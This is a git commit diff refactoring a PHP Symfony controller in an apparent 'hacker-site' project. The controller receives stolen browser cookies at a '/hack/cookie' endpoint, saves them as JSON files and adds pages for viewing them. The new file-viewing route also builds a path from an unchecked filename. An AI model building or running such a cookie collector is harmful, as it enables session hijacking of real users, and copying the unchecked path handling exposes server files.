18909b5de76663aed0cd4dff537d13d8d846f02a
JPechberty <j.pechberty@gmail.com>
2022-09-14 13:03:53 +0200

    Udpate Twigs view et refactoring HackController

--- hacker-site/src/Controller/HackController.php
+++ hacker-site/src/Controller/HackController.php
@@ -13,6 +13,7 @@ use Symfony\Component\Routing\Annotation\Route;
 
 class HackController extends AbstractController
 {
+    CONST STORAGE_PATH = "../var/storage/";
     private CookieRecordRepository $cookieRecordRepository;
 
     /**
@@ -26,13 +27,14 @@ class HackController extends AbstractController
     #[Route('/hack', name: 'app_hack')]
     public function index(): Response
     {
-        $cookieFileList = scandir('../var/storage');
+        $cookieFileList = scandir(self::STORAGE_PATH);
         array_splice($cookieFileList,0,2);
         $cookieFiles = [];
         foreach($cookieFileList as $c){
             $cookieFiles[] = [
-                "createdAt"=>filectime("../var/storage/$c"),
-                "name"=>$c
+                "createdAt"=>filectime(self::STORAGE_PATH.$c),
+                //"name"=>$c
+                "name"=>pathinfo(self::STORAGE_PATH.$c)["filename"]
             ];
         }
         return $this->render('hack/index.html.twig', [
@@ -42,8 +44,27 @@ class HackController extends AbstractController
         ]);
     }
 
-    #[Route('/hack/cookie', name: 'app_hack_cookies_text')]
-    public function grabCookiesToText(Request $request): Response
+    #[Route('/hack/cookies/files/{filename}', name: 'app_hack_cookie_file_content')]
+    public function showCookieFileContent(string $filename): Response
+    {
+        $content = json_decode(file_get_contents(self::STORAGE_PATH."$filename.json"),true);
+        $createdAt = filectime(self::STORAGE_PATH."$filename.json");
+        return $this->render('hack/show-cookie-file-content.html.twig', [
+            "content"=>$content,
+            "createdAt"=>$createdAt,
+            "filename"=>$filename
+        ]);
+    }
+
+    #[Route('/hack/cookies/records/{id}', name: 'app_hack_cookie_record')]
+    public function showCookieRecord(CookieRecord $record): Response
+    {
+        return $this->render('hack/show-cookie-record.html.twig', ["record"=>$record]);
+    }
+
+
+    #[Route('/hack/cookie', name: 'app_hack_cookies')]
+    public function grabCookies(Request $request): Response
     {
 
         $message = "No cookie for me ... ok that's was just a test ...";
@@ -79,7 +100,7 @@ class HackController extends AbstractController
     private function createTextFile(string $cookie): bool
     {
         $timestamp = (new DateTimeImmutable('now',new DateTimeZone('Europe/Paris')))->getTimestamp();
-        file_put_contents("../var/storage/mycookies-$timestamp.json", json_encode($this->formatCookie($cookie)));
+        file_put_contents(self::STORAGE_PATH."cookies-$timestamp.json", json_encode($this->formatCookie($cookie)));
         return true;
     }
 
